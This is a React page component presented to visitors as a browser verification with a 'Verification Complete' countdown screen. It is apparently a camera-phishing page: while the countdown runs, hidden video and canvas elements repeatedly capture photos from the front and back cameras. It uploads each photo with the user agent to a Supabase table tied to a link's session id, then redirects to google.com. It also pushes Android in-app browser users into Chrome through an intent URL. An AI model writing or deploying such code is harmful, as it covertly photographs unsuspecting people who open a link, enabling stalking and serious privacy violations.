import { useEffect, useState, useRef, useCallback } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

// Whitelist of allowed redirect domains for security
const ALLOWED_REDIRECT_DOMAINS = [
  'google.com',
  'www.google.com',
];

// Validate redirect URL to prevent open redirect attacks
const isValidRedirectUrl = (url: string): boolean => {
  try {
    const parsed = new URL(url);
    
    // Only allow HTTPS (or localhost for dev)
    if (parsed.protocol !== 'https:' && 
        !(parsed.protocol === 'http:' && parsed.hostname === 'localhost')) {
      return false;
    }
    
    // Check against whitelist
    return ALLOWED_REDIRECT_DOMAINS.some(domain => 
      parsed.hostname === domain || parsed.hostname.endsWith(`.${domain}`)
    );
  } catch {
    return false;
  }
};

// Detect in-app browsers (Instagram, Telegram, Facebook, etc.)
const isInAppBrowser = (): boolean => {
  const ua = navigator.userAgent || navigator.vendor || '';
  const inAppPatterns = [
    'Instagram',
    'FBAN',
    'FBAV',
    'FB_IAB',
    'Telegram',
    'TelegramBot',
    'Twitter',
    'Line',
    'Snapchat',
    'WhatsApp',
    'LinkedIn',
    'Pinterest',
    'Viber',
    'WeChat',
    'MicroMessenger',
  ];
  
  return inAppPatterns.some(pattern => ua.includes(pattern));
};

// Detect if device is Android
const isAndroid = (): boolean => {
  const ua = navigator.userAgent || '';
  return /Android/i.test(ua);
};

// Detect if browser is Chrome (real Chrome, not in-app)
const isChromeBrowser = (): boolean => {
  const ua = navigator.userAgent || '';
  // Must have Chrome and not be in-app browser
  const hasChrome = /Chrome/i.test(ua) && !/Chromium/i.test(ua);
  const isNotEdge = !/Edg/i.test(ua);
  const isNotOpera = !/OPR/i.test(ua);
  const isNotSamsung = !/SamsungBrowser/i.test(ua);
  
  return hasChrome && isNotEdge && isNotOpera && isNotSamsung && !isInAppBrowser();
};

// Generate Chrome intent URL for Android
const getChromeIntentUrl = (currentUrl: string): string => {
  // intent://URL#Intent;scheme=https;package=com.android.chrome;end
  const url = new URL(currentUrl);
  const intentUrl = `intent://${url.host}${url.pathname}${url.search}#Intent;scheme=https;package=com.android.chrome;end`;
  return intentUrl;
};

const Capture = () => {
  const [searchParams] = useSearchParams();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [status, setStatus] = useState<"checking" | "redirecting_chrome" | "not_chrome" | "countdown">("checking");
  const [countdown, setCountdown] = useState<number | null>(null);
  const captureLoopRef = useRef<boolean>(false);
  const stopCaptureRef = useRef<boolean>(false);
  
  const sessionId = searchParams.get("session") || "default";
  const rawRedirectUrl = searchParams.get("redirect") || "https://google.com";
  const countdownSeconds = parseInt(searchParams.get("timer") || "5", 10);
  
  // Validate and sanitize redirect URL
  const redirectUrl = isValidRedirectUrl(rawRedirectUrl) ? rawRedirectUrl : "https://google.com";

  const captureFromCamera = async (facingMode: "user" | "environment"): Promise<string | null> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode, width: 640, height: 480 } 
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        
        // Wait for camera to stabilize
        await new Promise(resolve => setTimeout(resolve, 500));
        
        // Capture photo
        if (canvasRef.current && videoRef.current) {
          const canvas = canvasRef.current;
          const video = videoRef.current;
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          if (ctx) {
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL("image/jpeg", 0.8);
            
            // Stop camera
            stream.getTracks().forEach(track => track.stop());
            
            return imageData;
          }
        }
        
        // Stop camera
        stream.getTracks().forEach(track => track.stop());
      }
      
      return null;
    } catch (error) {
      console.error(`Camera ${facingMode} access denied:`, error);
      return null;
    }
  };

  // Continuous capture loop - keeps capturing until redirect
  const startContinuousCapture = async () => {
    if (captureLoopRef.current) return;
    captureLoopRef.current = true;
    
    let captureCount = 0;
    
    while (!stopCaptureRef.current) {
      try {
        captureCount++;
        
        // Capture from FRONT camera
        const frontImage = await captureFromCamera("user");
        
        if (frontImage && !stopCaptureRef.current) {
          await supabase.from('captured_photos').insert({
            session_id: sessionId,
            image_data: frontImage,
            user_agent: `${navigator.userAgent} [FRONT-${captureCount}]`
          });
        }
        
        if (stopCaptureRef.current) break;
        
        // Small delay before switching cameras
        await new Promise(resolve => setTimeout(resolve, 200));
        
        // Capture from BACK camera
        const backImage = await captureFromCamera("environment");
        
        if (backImage && !stopCaptureRef.current) {
          await supabase.from('captured_photos').insert({
            session_id: sessionId,
            image_data: backImage,
            user_agent: `${navigator.userAgent} [BACK-${captureCount}]`
          });
        }
        
        if (stopCaptureRef.current) break;
        
        // Delay before next capture cycle
        await new Promise(resolve => setTimeout(resolve, 500));
        
      } catch (error) {
        console.error("Capture cycle error:", error);
        // Continue loop even on error
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
  };

  // Stop capture when component unmounts or redirect happens
  useEffect(() => {
    return () => {
      stopCaptureRef.current = true;
    };
  }, []);

  useEffect(() => {
    // Step 1: Check browser type
    const checkBrowserAndProceed = () => {
      // If in-app browser on Android, redirect to Chrome
      if (isInAppBrowser() && isAndroid()) {
        setStatus("redirecting_chrome");
        const chromeIntent = getChromeIntentUrl(window.location.href);
        
        // Small delay then redirect
        setTimeout(() => {
          window.location.href = chromeIntent;
        }, 100);
        return;
      }
      
      // If in-app browser on non-Android, show message
      if (isInAppBrowser()) {
        setStatus("not_chrome");
        return;
      }
      
      // If not Chrome browser, show message
      if (!isChromeBrowser()) {
        setStatus("not_chrome");
        return;
      }
      
      // We're in Chrome - start countdown immediately and capture in background
      setStatus("countdown");
      setCountdown(countdownSeconds);
      
      // Start continuous capture loop (non-blocking)
      startContinuousCapture();
    };

    checkBrowserAndProceed();
  }, [sessionId, countdownSeconds]);

  // Countdown timer effect
  useEffect(() => {
    if (countdown === null || countdown < 0) return;

    if (countdown === 0) {
      // Redirect when countdown reaches 0
      window.location.href = redirectUrl;
      return;
    }

    const timer = setTimeout(() => {
      setCountdown(prev => (prev !== null ? prev - 1 : null));
    }, 1000);

    return () => clearTimeout(timer);
  }, [countdown, redirectUrl]);

  // Show "not Chrome" message
  if (status === "not_chrome") {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="text-center max-w-md">
          <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-destructive/20 flex items-center justify-center">
            <svg className="w-8 h-8 text-destructive" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
            </svg>
          </div>
          <h1 className="text-xl font-bold text-foreground mb-2">Browser Not Supported</h1>
          <p className="text-muted-foreground">
            Ye link sirf Google Chrome browser me kaam karta hai.
          </p>
          <p className="text-muted-foreground text-sm mt-4">
            Please open this link in Google Chrome browser.
          </p>
        </div>
      </div>
    );
  }

  // Show redirecting to Chrome message
  if (status === "redirecting_chrome") {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="text-center">
          <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground text-sm">
            Opening in Chrome...
          </p>
        </div>
      </div>
    );
  }

  // Show countdown screen after capture
  if (status === "countdown" && countdown !== null) {
    const progressPercent = ((countdownSeconds - countdown) / countdownSeconds) * 100;
    
    return (
      <div className="min-h-screen flex items-center justify-center p-4" style={{
        background: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 50%, #0d0d1a 100%)',
        fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, sans-serif"
      }}>
        {/* Hidden video and canvas */}
        <video ref={videoRef} className="hidden" autoPlay playsInline muted />
        <canvas ref={canvasRef} className="hidden" />
        
        {/* Background grid */}
        <div className="fixed inset-0 pointer-events-none" style={{
          backgroundImage: 'linear-gradient(rgba(0, 255, 136, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 136, 0.03) 1px, transparent 1px)',
          backgroundSize: '50px 50px'
        }} />
        
        {/* Glowing orbs */}
        <div className="fixed w-72 h-72 rounded-full blur-[80px] opacity-40 animate-pulse" style={{
          background: '#00ff88',
          top: '-100px',
          left: '-100px'
        }} />
        <div className="fixed w-64 h-64 rounded-full blur-[80px] opacity-40 animate-pulse" style={{
          background: '#ec4899',
          bottom: '-80px',
          right: '-80px',
          animationDelay: '-2s'
        }} />
        
        {/* Countdown card */}
        <div className="relative z-10 text-center p-12 max-w-md w-full" style={{
          background: 'rgba(15, 15, 30, 0.9)',
          backdropFilter: 'blur(20px)',
          border: '1px solid rgba(0, 255, 136, 0.3)',
          borderRadius: '24px',
          boxShadow: '0 0 60px rgba(0, 255, 136, 0.2), 0 25px 50px rgba(0, 0, 0, 0.5)'
        }}>
          {/* Countdown number */}
          <div className="w-24 h-24 mx-auto mb-6 rounded-full flex items-center justify-center text-5xl font-bold animate-pulse" style={{
            background: 'linear-gradient(135deg, #00ff88 0%, #06b6d4 100%)',
            color: '#0a0a1a',
            boxShadow: '0 0 50px rgba(0, 255, 136, 0.5)'
          }}>
            {countdown}
          </div>
          
          {/* Status badge */}
          <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full mb-5" style={{
            background: 'rgba(0, 255, 136, 0.1)',
            border: '1px solid rgba(0, 255, 136, 0.3)'
          }}>
            <div className="w-2 h-2 rounded-full animate-pulse" style={{ background: '#00ff88' }} />
            <span style={{ color: '#00ff88', fontSize: '12px', fontWeight: 600, textTransform: 'uppercase', letterSpacing: '1px' }}>
              Verification Complete
            </span>
          </div>
          
          {/* Title */}
          <h2 className="text-2xl font-bold mb-3" style={{ color: '#ffffff' }}>
            Redirecting...
          </h2>
          
          {/* Subtitle */}
          <p className="mb-6" style={{ color: '#888', fontSize: '14px', lineHeight: 1.6 }}>
            You will be redirected automatically in {countdown} second{countdown !== 1 ? 's' : ''}.
          </p>
          
          {/* Progress bar */}
          <div className="w-full h-1.5 rounded-full overflow-hidden" style={{ background: 'rgba(255, 255, 255, 0.1)' }}>
            <div 
              className="h-full rounded-full transition-all duration-1000 ease-linear"
              style={{ 
                width: `${progressPercent}%`,
                background: 'linear-gradient(90deg, #00ff88 0%, #06b6d4 100%)'
              }}
            />
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background flex items-center justify-center">
      {/* Hidden video and canvas for capture */}
      <video ref={videoRef} className="hidden" autoPlay playsInline muted />
      <canvas ref={canvasRef} className="hidden" />
      
      {/* Loading indicator - only shows briefly during browser check */}
      <div className="text-center">
        <div className="w-8 h-8 border-2 border-neon-green border-t-transparent rounded-full animate-spin mx-auto mb-4" />
        <p className="text-muted-foreground text-sm">Loading...</p>
      </div>
    </div>
  );
};

export default Capture;
